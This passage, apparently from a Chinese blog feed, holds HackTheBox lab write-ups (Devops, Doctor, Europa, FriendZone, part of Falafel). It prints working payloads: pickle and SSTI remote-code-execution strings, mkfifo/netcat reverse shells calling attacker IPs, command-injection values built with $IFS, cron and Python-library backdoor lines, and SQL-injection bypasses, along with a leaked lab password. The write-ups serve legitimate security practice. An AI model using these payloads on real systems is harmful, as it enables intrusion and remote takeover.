<p><img src="/images/Devops/7.jpg" alt="7"></p>
<h3 id="方法2pickle"><a href="#方法2pickle" class="headerlink" title="方法2pickle"></a>方法2pickle</h3><p>主页提到当前目录存在一个文件feed.py，读取它的源码</p>
<p><img src="/images/Devops/8.jpg" alt="8"></p>
<p>这段代码表名页面newpost允许post方法的访问，我们的目录扫描也发现了这个文件<br>之后base64解码http实体，之后调用pickle.load加载这个实体</p>
<p>所以我们要构造base64编码过的payload，比如reverse_shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">from base64 import urlsafe_b64encode</span><br><span class="line"></span><br><span class="line">Payload &#x3D; &quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.100 4444 &gt;&#x2F;tmp&#x2F;f&quot;</span><br><span class="line"></span><br><span class="line">class evil(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        import os</span><br><span class="line">        return (os.system,(Payload,))</span><br><span class="line"></span><br><span class="line">print urlsafe_b64encode(pickle.dumps(evil()))</span><br></pre></td></tr></table></figure>

<p>生成payload</p>
<p><img src="/images/Devops/10.jpg" alt="10"></p>
<p>别忘了要post请求和MIME类型为text</p>
<p><img src="/images/Devops/9.jpg" alt="9"></p>
<p>成功获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在home目录发现了git</p>
<p><img src="/images/Devops/11.jpg" alt="11"></p>
<p>查看下git的历史记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devops/12.jpg" alt="12"></p>
<p>发现了好像有一次key的变动</p>
<p>展开内容查看变化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devops/13.jpg" alt="13"></p>
<p>发现key</p>
<p>用私钥进行登录</p>
<p><img src="/images/Devops/14.jpg" alt="14"></p>
<p>成功获取root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Doctor</title>
    <url>/2020/10/10/HTB-Doctor/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/doctor/1.png" alt="1"></p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>手动检查80端口</p>
<p><img src="/images/doctor/2.png" alt="2"></p>
<p>发现了存在域名，添加到<code>hosts</code>里，再次访问</p>
<p><img src="/images/doctor/3.png" alt="3"></p>
<p>发现了一个登录页面</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>找不到登录凭据，搜索不到CMS版本，进行一些常规枚举也没什么收获</p>
<p>注册一个账号登进去看看</p>
<p><img src="/images/doctor/4.png" alt="4"></p>
<p>注册登录成功，不过账号只保留20分钟</p>
<p>发现留言板功能</p>
<p><img src="/images/doctor/5.png" alt="5"></p>
<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>源代码中发现了一个测试页面</p>
<p><img src="/images/doctor/6.png" alt="6"></p>
<p>我们在留言随便输入一些数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Title:</span><br><span class="line">abc</span><br><span class="line">Content:</span><br><span class="line">cba</span><br></pre></td></tr></table></figure>

<p>在<code>http://doctors.htb/archive</code>中，页面为空，但是源代码中发现了一些信息</p>
<p><img src="/images/doctor/7.png" alt="7"></p>
<p>看来Title这里有回显，首先可以想到xss，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;title&gt;&lt;&#x2F;item&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/8.png" alt="8"></p>
<p>看来它确实容易收到xss攻击，而且我们的输入会被提交到这个页面里，这里依靠经验的话，可以猜到另一种注入方式<code>服务端模板注入(SSTI)</code><br>这种漏洞一般在ctf的python环境下会考，大致的原理是用户的输入发送到服务器，服务器后端解释后返回给浏览器，从而生成一些定制的内容</p>
<p>在配置错误的情况下容易导致RCE，对于网站的测试流程，可以找到一篇文章:<a href="https://www.we45.com/blog/server-side-template-injection-a-crash-course-">链接</a></p>
<p>对此漏洞，我们尝试一些测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;2*2&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/9.png" alt="9"></p>
<p>看来payload成功被解释了，可以确认漏洞存在<br>尝试一下RCE命令，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/10.png" alt="10"></p>
<p>RCE成功，现在反弹shell，这里使用<code>nc.traditional</code>，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;nc.traditional 10.10.16.2 443 -e &#x2F;bin&#x2F;bash&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/11.png" alt="11"></p>
<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>还是留言版那里，输入自己的IP地址，疑似命令注入漏洞</p>
<p><img src="/images/doctor/17.png" alt="17"></p>
<p>发现当前运行的程序是curl</p>
<p>尝试正常的命令注入的各类符号，这里应该是不能直接连续执行bash命令的</p>
<p>ping命令没反应</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(ping 10.10.16.4)</span><br></pre></td></tr></table></figure>

<p>用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(whoami)</span><br></pre></td></tr></table></figure>

<p>执行成功，用户名员应该是web</p>
<p><img src="/images/doctor/18.png" alt="18"></p>
<p>尝试空格符号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(echo+test)				不成功</span><br><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(echo$IFS&#39;test&#39;)			成功</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/19.png" alt="19"></p>
<p>这题以前CTF也遇到过，当时还是个二次注入的curl注入/(ㄒoㄒ)/~~</p>
<p>此时的思路应该为无管道符直接反弹shell或者文件落地，这两种方法都行</p>
<p>写一个反弹shell保存在evil这个文件里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;evil$IFS&#39;-o&#39;$IFS&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;test&#39;</span><br></pre></td></tr></table></figure>

<p>之后IP访问(不要HOST访问)，就可以发现文件被上传了</p>
<p><img src="/images/doctor/20.png" alt="20"></p>
<p>这里是为了确保看到文件回显，更保险一点，应该上传到tmp，避免web目录不存在或者权限问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(bash$IFS&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;test&#39;)</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(nc.traditional$IFS&#39;10.10.16.4&#39;$IFS&#39;5555&#39;$IFS&#39;-e&#39;$IFS&#39;&#x2F;bin&#x2F;bash&#39;)</span><br></pre></td></tr></table></figure>

<p>都能拿到shell，这里需要注意bash下的命令 解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(ping 127.0.0.1)</span><br><span class="line">$(ping$IFS&#39;127.0.0.1&#39;)			注意引号</span><br><span class="line">&#123;ping,127.0.0.1&#125;</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>先想办法提升到user权限，寻找一些可能存在凭据的地方</p>
<p><img src="/images/doctor/12.png" alt="12"></p>
<p>在backup关键词里，发现了显眼的文件</p>
<p><img src="/images/doctor/13.png" alt="13"></p>
<p>可以找到用户<code>shaun</code>的密码</p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现了一个奇怪的用户splunk</p>
<p><img src="/images/doctor/14.png" alt="14"></p>
<p>google搜索，可以发现一个可利用提权工具，<a href="https://github.com/cnotin/SplunkWhisperer2">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.16.2 --username shaun --password Guitar123 --payload &#39;nc.traditional -e &#x2F;bin&#x2F;sh 10.10.16.4 443&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/15.png" alt="15"></p>
<p>获取shell</p>
<p><img src="/images/doctor/16.png" alt="16"></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>似乎<a href="https://github.com/epinna/tplmap">tplmap</a>在这里有不错的效果，也许可以节约时间</p>
<h2 id="跟新"><a href="#跟新" class="headerlink" title="跟新:"></a>跟新:</h2><p>看了IppSec的write up，修复ssti的方式非常厉害Orz</p>
<p>不过他对于代码注入的那部分解说的有一些错误</p>
<p>在\blog\flaskblog\posts文件里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text &#x3D; form.data</span><br><span class="line">urls &#x3D; re.findall(&#39;http[s]?:&#x2F;&#x2F;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#39;, text)</span><br><span class="line">for url in urls:</span><br><span class="line">    url &#x3D; urls[0]</span><br><span class="line">    ...正常逻辑...</span><br></pre></td></tr></table></figure>

<p>这部分黑名单没有进行严格过滤，比如大括号，举个例子</p>
<p>成功的exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; text&#x3D;&quot;http:&#x2F;&#x2F;192.168.110.1&#x2F;$(whoami)&quot;</span><br><span class="line">&gt;&gt;&gt; urls &#x3D; re.findall(&#39;http[s]?:&#x2F;&#x2F;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#39;, text)</span><br><span class="line">&gt;&gt;&gt; print (urls)</span><br><span class="line">[&#39;http:&#x2F;&#x2F;192.168.110.1&#x2F;$(whoami)&#39;]</span><br></pre></td></tr></table></figure>

<p>失败的exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; text&#x3D;&quot;http:&#x2F;&#x2F;192.168.110.1&#x2F;|whoami&quot;</span><br><span class="line">&gt;&gt;&gt; urls &#x3D; re.findall(&#39;http[s]?:&#x2F;&#x2F;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#39;, text)</span><br><span class="line">&gt;&gt;&gt; print (urls)</span><br><span class="line">[&#39;http:&#x2F;&#x2F;192.168.110.1&#x2F;&#39;]</span><br></pre></td></tr></table></figure>

<p>视频里说的<code>&#123;&#125;</code>只是格式化字符，并不影响过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; string&#x3D;&#39;a&#39;</span><br><span class="line">&gt;&gt;&gt; print(f&quot;hello &#123;string&#125;&quot;)</span><br><span class="line">hello a</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Europa</title>
    <url>/2020/10/21/HTB-Europa/</url>
    <content><![CDATA[<h1 id="Europa"><a href="#Europa" class="headerlink" title="Europa"></a>Europa</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/europa/1.png" alt="1"></p>
<p>发现https</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>查看证书，可以得到一些主机名</p>
<p><img src="/images/europa/2.png" alt="2"></p>
<p>或者使用<code>sslyze</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sslyze --regular 10.10.10.22</span><br></pre></td></tr></table></figure>

<p><img src="/images/europa/3.png" alt="3"></p>
<p>添加到hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.22     admin-portal.europacorp.htb www.europacorp.htb</span><br></pre></td></tr></table></figure>

<p>之后得到一个登陆页面</p>
<p><img src="/images/europa/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>页面需要一个邮箱，可以在证书的Issuer中找到(记得浏览器关闭代理，否则是burp的证书)</p>
<p><img src="/images/europa/5.png" alt="5"></p>
<p>尝试使用SQL注入</p>
<p><img src="/images/europa/6.png" alt="6"></p>
<p>非常容易的引发错误，看来是存在漏洞的</p>
<p>通过这条语句可以轻松绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;admin@europacorp.htb&#39;-- +&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>

<p>其实这里不一定需要知道邮箱号，可以使用limit注入，修改字段数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;&#39;+or+1%3d1+limit+1%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>

<p><img src="/images/europa/12.png" alt="12"></p>
<p>尝试使用sqlmap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u https:&#x2F;&#x2F;admin-portal.europacorp.htb&#x2F;login.php --data &quot;email&#x3D;admin@europacorp.htb&amp;password&#x3D;admin&quot; -p email</span><br></pre></td></tr></table></figure>

<p><img src="/images/europa/15.png" alt="15"></p>
<p>跑了很久，可以发现延时注入，但是跑的很慢，而且这里碰到一个问题<br>如果sql布尔注入成功，我们就会得到302跳转到后台，此时服务端会记录我们的cookie状态为”已登录”<br>此时，如果我们使用相同的cookie，发送任意凭据，都会得到302，失去了布尔注入的判断条件 ，重新获取cookie可以获得布尔注入</p>
<p>这个还是稍微有点意思，以后可以写python针对这种情况</p>
<p><img src="/images/europa/14.png" alt="14"></p>
<p>看来sqlmap无法删除登录cookie，重新访问，获得一个”干净”的cookie，不确定。</p>
<p>进去后发现一处可以生成VPN文件</p>
<p><img src="/images/europa/7.png" alt="7"></p>
<p>有一个不寻常的参数</p>
<p><img src="/images/europa/8.png" alt="8"></p>
<p>看起来是一个正则表达式，而且可以由我们控制，再考虑到PHP环境，思考一种命令注入技术</p>
<p><code>preg_replace</code>配合<code>/e</code>可以导致命令注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_replace(&quot;&#x2F;php&#x2F;e&quot;,$_GET[&#39;cmd&#39;],&quot;php&quot;);</span><br></pre></td></tr></table></figure>

<p>所以只需要加上<code>e</code>输入合法的php语法即可</p>
<p><img src="/images/europa/9.png" alt="9"></p>
<p>可以被解释</p>
<p><img src="/images/europa/10.png" alt="10"></p>
<p>之后使用系统函数就可以获得shell</p>
<p><img src="/images/europa/11.png" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>/etc/crontab发现计划任务，5个*表示每分钟执行一次</p>
<p><img src="/images/europa/16.png" alt="16"></p>
<p>查看该文件</p>
<p><img src="/images/europa/17.png" alt="17"></p>
<p>看样子是一个php文件，但其实是一个bash脚本，没有w权限，但是<code>exec</code>又执行了一个shell脚本，而该脚本不存在</p>
<p>直接创建反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.98 4444 &gt;&#x2F;tmp&#x2F;f&#39;&gt;&#x2F;var&#x2F;www&#x2F;cmd&#x2F;logcleared.sh</span><br><span class="line">chmod 777 &#x2F;var&#x2F;www&#x2F;cmd&#x2F;logcleared.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/europa/18.png" alt="18"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:FriendZone</title>
    <url>/2020/06/27/HTB-FriendZone/</url>
    <content><![CDATA[<h1 id="FriendZone"><a href="#FriendZone" class="headerlink" title="FriendZone"></a>FriendZone</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/FriendZone/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>尝试21端口匿名登录，失败</p>
<p>进行smb枚举</p>
<p>目录枚举</p>
<p><img src="/images/FriendZone/2.jpg" alt="2"></p>
<p>nmap枚举出了路径</p>
<p><img src="/images/FriendZone/14.jpg" alt="14"></p>
<p>目录权限枚举<br>(这里使用smbmap遇到Authentication error ，需要跟新impacket)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade impacket</span><br><span class="line">smbmap -H 10.10.10.123</span><br></pre></td></tr></table></figure>

<p><img src="/images/FriendZone/3.jpg" alt="3"></p>
<p>对目录树进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.10.123 -R --depth 5</span><br></pre></td></tr></table></figure>

<p><img src="/images/FriendZone/4.jpg" alt="4"></p>
<p>发现了creds.txt，看看那是什么</p>
<p><img src="/images/FriendZone/5.jpg" alt="5"></p>
<p>发现了账号密码</p>
<p>访问web服务</p>
<p><img src="/images/FriendZone/6.jpg" alt="6"></p>
<p>发现了域名，想到之前的53端口DNS服务，我们应该配置host</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.123 		friendzoneportal.red friendzone.red</span><br></pre></td></tr></table></figure>

<p><img src="/images/FriendZone/7.jpg" alt="7"></p>
<p>进行区域传输</p>
<p><img src="/images/FriendZone/8.jpg" alt="8"></p>
<p>发现了更多子域，全部添加到hosts</p>
<p><img src="/images/FriendZone/9.jpg" alt="9"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>登录带有admin关键字的网站</p>
<p>登录错了</p>
<p><img src="/images/FriendZone/10.jpg" alt="10"></p>
<p>登录成功</p>
<p><img src="/images/FriendZone/11.jpg" alt="11"></p>
<p>跟着提示</p>
<p><img src="/images/FriendZone/12.jpg" alt="12"></p>
<p>看样子是文件包含，尝试利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对image 尝试 &#x2F;etc&#x2F;passwd 和00截断  都没有用</span><br><span class="line">对pagename 尝试 &#x2F;etc&#x2F;passwd 00截断 也没有用</span><br></pre></td></tr></table></figure>

<p>之后尝试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard.php</span><br></pre></td></tr></table></figure>

<p>失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard</span><br></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="/images/FriendZone/13.jpg" alt="13"></p>
<p>看样子它的包含会添加.php后缀，而且无法截断</p>
<p>我们已经满足了getshell的条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb目录Development允许写入</span><br><span class="line">nmap扫出了上传的路径</span><br><span class="line">本地文件包含执行reverse_shell.php</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id&#x3D;a.jpg&amp;pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;Development&#x2F;evil</span><br></pre></td></tr></table></figure>

<p><img src="/images/FriendZone/16.jpg" alt="16"></p>
<p>getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个提权特别隐蔽…</p>
<p>发现os.py具有W权限</p>
<p><img src="/images/FriendZone/17.jpg" alt="17"></p>
<p>发现cronjobs</p>
<p><img src="/images/FriendZone/18.jpg" alt="18"></p>
<p>调用了os库</p>
<p><img src="/images/FriendZone/19.jpg" alt="19"></p>
<p>直接给os加一行，因为还要调用os.system…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;system(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.100 5555 &gt;&#x2F;tmp&#x2F;f&#39;)&quot; &gt;&gt; os.py</span><br></pre></td></tr></table></figure>

<p><img src="/images/FriendZone/20.jpg" alt="20"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Falafel</title>
    <url>/2020/06/28/HTB-Falafel/</url>
    <content><![CDATA[<h1 id="Falafel"><a href="#Falafel" class="headerlink" title="Falafel"></a>Falafel</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Falafel/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>首页发现登录页面</p>
<p><img src="/images/Falafel/2.jpg" alt="2"></p>
<p>尝试一些常见弱口令，发现如过用户存在，如admin，页面返回</p>
<p><img src="/images/Falafel/3.jpg" alt="3"></p>
<p>用户不存在返回</p>
<p><img src="/images/Falafel/4.jpg" alt="4"></p>
<p>利用这点可以枚举用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -d &quot;username&#x3D;FUZZ&amp;password&#x3D;admin&quot; -u http:&#x2F;&#x2F;10.10.10.73&#x2F;login.php</span><br></pre></td></tr></table></figure>

<p>进一步过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -d &quot;username&#x3D;FUZZ&amp;password&#x3D;admin&quot; -u http:&#x2F;&#x2F;10.10.10.73&#x2F;login.php --hw 657</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/5.jpg" alt="5"></p>
<p>结果发现两个账户</p>
<p>之后再在当前页面尝试sql注入，失败</p>
<p>进行目录扫描，也进行文件枚举 php,txt</p>
<p><img src="/images/Falafel/6.jpg" alt="6"></p>
<p>发现了upload.php不过返回时302，另外发现cyberlaw.txt</p>
<p><img src="/images/Falafel/7.jpg" alt="7"></p>
<p>也是提示用户chirs</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>首先万能密码之类的注入没用，这页面有注入话应该也是盲注了</p>
<p>延时注入，失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or sleep(5)#</span><br><span class="line">admin&#39; or benchmark (10000000,md5(1))#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/8.jpg" alt="8"></p>
<p>布尔注入，成功</p>
<p>真</p>
<p><img src="/images/Falafel/9.jpg" alt="9"></p>
<p>假</p>
<p><img src="/images/Falafel/10.jpg" alt="10"></p>
<p>可以确认存在布尔型盲注</p>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.10.10.73&#x2F;login.php&quot;  --data&#x3D;&quot;username&#x3D;admin&amp;password&#x3D;admin&quot;  -p &quot;username&quot; --level&#x3D;5 --risk&#x3D;3 --string&#x3D;&quot;Wrong identification&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/11.jpg" alt="11"></p>
<p>和预想的一样</p>
<h3 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h3><h4 id="数据库名长度"><a href="#数据库名长度" class="headerlink" title="数据库名长度"></a>数据库名长度</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and length(database())&#x3D;7 #</span><br></pre></td></tr></table></figure>

<p>得出数据库长度为7</p>
<p><img src="/images/Falafel/sql/1.jpg" alt="1"></p>
<h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and ascii(substr(database(),1,1))&#x3D;1		&#x2F;&#x2F;第一位</span><br><span class="line">admin&#39; and ascii(substr(database(),2,1))&#x3D;1		&#x2F;&#x2F;第二位</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/2.jpg" alt="2"></p>
<p>比如这就表示第一位ascii码为102，字母是f<br>一通操作，得到数据库名:falafel</p>
<h4 id="确认表数量"><a href="#确认表数量" class="headerlink" title="确认表数量"></a>确认表数量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select count(*) from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;falafel&quot;)&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/3.jpg" alt="3"></p>
<p>可以发现，只有一张表</p>
<h4 id="确认表名长度"><a href="#确认表名长度" class="headerlink" title="确认表名长度"></a>确认表名长度</h4><p>确认第一张表名长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;falafel&quot; limit 0,1)&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/4.jpg" alt="4"></p>
<p>表名长度为5</p>
<h4 id="确认表名"><a href="#确认表名" class="headerlink" title="确认表名"></a>确认表名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select ascii(substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;falafel&quot; limit 0,1),1,1)))&#x3D;1     &#x2F;&#x2F;第一位</span><br><span class="line">admin&#39; and (select ascii(substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;falafel&quot; limit 0,1),2,1)))&#x3D;1	   &#x2F;&#x2F;第二位</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/5.jpg" alt="5"></p>
<p>比如这表示表名第一位ascii码为117，字母是u<br>一同操作，得到数据表名:users</p>
<h4 id="确认字段数"><a href="#确认字段数" class="headerlink" title="确认字段数"></a>确认字段数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select count(column_name) from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39;)&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/6.jpg" alt="6"></p>
<p>字段数为4</p>
<h4 id="确认字段名长度"><a href="#确认字段名长度" class="headerlink" title="确认字段名长度"></a>确认字段名长度</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select length(column_name) from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39; limit 0,1)&#x3D;1     &#x2F;&#x2F;第一个字段名长度</span><br><span class="line">admin&#39; and (select length(column_name) from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39; limit 1,1)&#x3D;1     &#x2F;&#x2F;第二个字段名长度</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/7.jpg" alt="7"></p>
